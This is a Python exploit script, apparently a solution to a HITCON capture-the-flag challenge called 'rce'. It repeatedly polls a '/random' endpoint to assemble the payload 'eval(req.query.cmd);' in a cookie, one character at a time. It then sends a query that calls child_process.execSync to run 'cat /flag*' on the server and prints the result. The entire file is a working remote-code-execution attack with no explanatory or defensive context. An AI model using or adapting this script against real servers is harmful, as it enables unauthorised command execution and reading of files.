import requests
import codecs

url1 = "http://2k6gre4bmq.rce.chal.hitconctf.com/"
url = url1 + '/random'

command_hex = codecs.encode(b'eval(req.query.cmd);', "hex")
print(command_hex)

responseInitial = requests.get(url1)
initial_cookie = responseInitial.cookies.get_dict()['code']

cookies = {'code': initial_cookie}
position = 0
while True:
	r = requests.get(url, cookies=cookies)
	new_cookie = r.cookies.get_dict()['code']

	if(position < 40):
		if new_cookie[4+position] == chr(command_hex[position]):
			position+=1
			cookies = {'code': new_cookie}
			print("PROGRESS: " + str(position) + "/40" + " Sending: "  + new_cookie)

	if(position == len(command_hex)):
		break

a = requests.get(url + "?cmd=require('child_process').execSync('cat%20%2Fflag*').toString()", cookies=cookies)
print(a.text)
